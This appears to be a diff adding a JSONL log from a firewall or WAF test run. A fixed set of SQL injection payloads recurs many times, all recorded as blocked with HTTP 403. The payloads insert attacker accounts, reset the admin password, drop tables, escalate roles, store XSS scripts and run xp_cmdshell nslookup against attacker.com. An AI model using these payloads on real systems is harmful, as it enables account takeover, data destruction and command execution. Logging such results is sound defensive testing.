@@ -1,0 +1,300 @@
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006152615002065431}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003758111997740343}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003124549002677668}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030757530039409176}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030788410003879108}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030528810020769015}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005998012005875353}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004548656004772056}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004145204999076668}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004628089001926128}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005343034994439222}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042548569981590845}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004943569998431485}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003860153999994509}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031940929984557442}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003153154997562524}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031790450011612847}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029027190030319616}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033815510032582097}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003512627001327928}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034404819962219335}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004407884000102058}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003970146004576236}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005321213000570424}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004575247003231198}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003764679000596516}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003954565996536985}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038060189981479198}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00392707200080622}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004338779996032827}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004901299005723558}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046280799942906015}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00539066700002877}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005731163997552358}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007004712002526503}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0054883150005480275}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006856975000118837}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006595229002414271}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004908793998765759}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009760700995684601}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00421750499663176}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004271224002877716}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005550136003876105}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003882345001329668}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033159890008391812}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003092787999776192}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035311450046719983}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002919939004641492}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002827550000802148}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003101944996160455}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029601109999930486}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003816418000496924}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004895958998531569}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004150052998738829}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004981543999747373}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0050048289995174855}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042366520065115765}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040397580014541745}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003922707001038361}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003504099993733689}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038051099982112646}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004252721999364439}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003685806004796177}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037102069982211106}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036259760017856024}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003639295005996246}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003355581997311674}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003264174003561493}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031466810032725334}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003386912001587916}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00411394899856532}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005289090004225727}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003282334000687115}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033811809989856556}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036257050014683045}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004086361994268373}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004898233004496433}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004338209000707138}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003602313998271711}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035058729990851134}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034480600006645545}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004146977997152135}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004012539000541437}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003647120000096038}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003678455999761354}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004275202001736034}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0050419779945514165}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004872997000347823}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00483284499932779}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00441650200082222}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003989929995441344}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00495923199923709}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004301095999835525}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046381389984162524}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045070060004945844}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004932730000291485}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004022496999823488}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003936222004995216}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004117140000744257}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005922785996517632}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004952378003508784}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004329180999775417}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005430593999335542}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004751649001264013}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003918250004062429}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037475849967449903}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00364568399527343}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031838229988352396}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0028544550004880875}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002812344995618332}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031300990012823604}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00285817300027702}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.002933861003839411}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0029647690025740303}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0028739439949276857}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030612620030296966}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038553729973500594}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003491666000627447}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030766459967708215}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031487559972447343}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030536460035364144}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003366486998856999}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005152640995220281}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034871710013248958}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035158169994247146}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004411740002979059}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004359850994660519}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003779578000830952}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036086960026295856}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036672299975180067}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003509583999402821}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003193864002241753}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034432890024618246}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003185473004123196}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031614350009476766}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035735549972741865}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033478920013294555}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034745270022540353}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003288307001639623}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035494900002959184}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031937449966790155}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0032920419980655424}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004506525001488626}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004788660997292027}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004350863004219718}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004656929995690007}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004422418001922779}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00542928100185236}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004781237999850418}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005170939002709929}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005290723995130975}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005751705997681711}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003960957998060621}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003866716993798036}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005017233001126442}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003990675999375526}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003547877997334581}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003943914998671971}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004601597996952478}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005032934001064859}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004109375004190952}
+{"payload": "'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003855185001157224}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004229968006256968}
+{"payload": "'; UPDATE users SET status='active' WHERE username='banneduser'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004768383005284704}
+{"payload": "'; UPDATE orders SET status='shipped' WHERE order_id=1--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035839120027958415}
+{"payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004663027997594327}
+{"payload": "'; UPDATE users SET password='newpassword' WHERE username='admin'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038395280062104575}
+{"payload": "'; DROP TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003647302000899799}
+{"payload": "'; EXEC xp_cmdshell('nslookup attacker.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003517298995575402}
+{"payload": "'; INSERT INTO comments (comment) VALUES ('<script>alert(\"XSS\")</script>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004648931004339829}
+{"payload": "'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036827339936280623}
+{"payload": "'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0031035240026540123}
+{"payload": "'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0030987589998403564}
+{"payload": "'; UPDATE users SET role='admin' WHERE username='guest'--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034279960018466227}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('<iframe src=\"http://attacker.com\"></iframe>')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034185479962616228}
+{"payload": "'; INSERT INTO profile (bio) VALUES ('<img src=\"javascript:alert(1)\">')--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035767060035141185}
